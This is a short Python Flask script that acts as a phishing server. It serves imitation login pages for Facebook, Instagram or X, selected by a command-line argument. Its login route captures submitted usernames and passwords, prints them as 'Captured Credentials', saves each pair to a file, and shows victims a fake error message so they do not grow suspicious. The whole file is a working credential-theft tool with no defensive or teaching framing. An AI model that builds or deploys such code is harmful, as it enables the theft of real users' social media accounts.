from flask import Flask, render_template, request
import sys

# Initialize Flask app
app = Flask(__name__)

# Routes
@app.route('/')
def home():
    # Determine the target page based on the command-line argument
    target = sys.argv[1] if len(sys.argv) > 1 else "0"
    pages = {
        "1": "fb.html",
        "2": "insta.html",
        "3": "x.html",
    }
    page = pages.get(target, "error.html")  # Default to error page if invalid

    return render_template(page)

@app.route('/login', methods=['POST'])
def login():
    # Capture credentials
    username = request.form.get('username')
    password = request.form.get('password')

    # Log the captured data
    print(f"Captured Credentials:\nUsername: {username}\nPassword: {password}")

    # Save credentials to a file
    with open(f"Cap_file/{username}.txt", "w") as file:
        file.write(f"Username: {username}\nPassword: {password}\n")

    return "<h2>Something went wrong, Please try again later.</h2>"

if __name__ == '__main__':
    app.run(debug=True, port=8001)

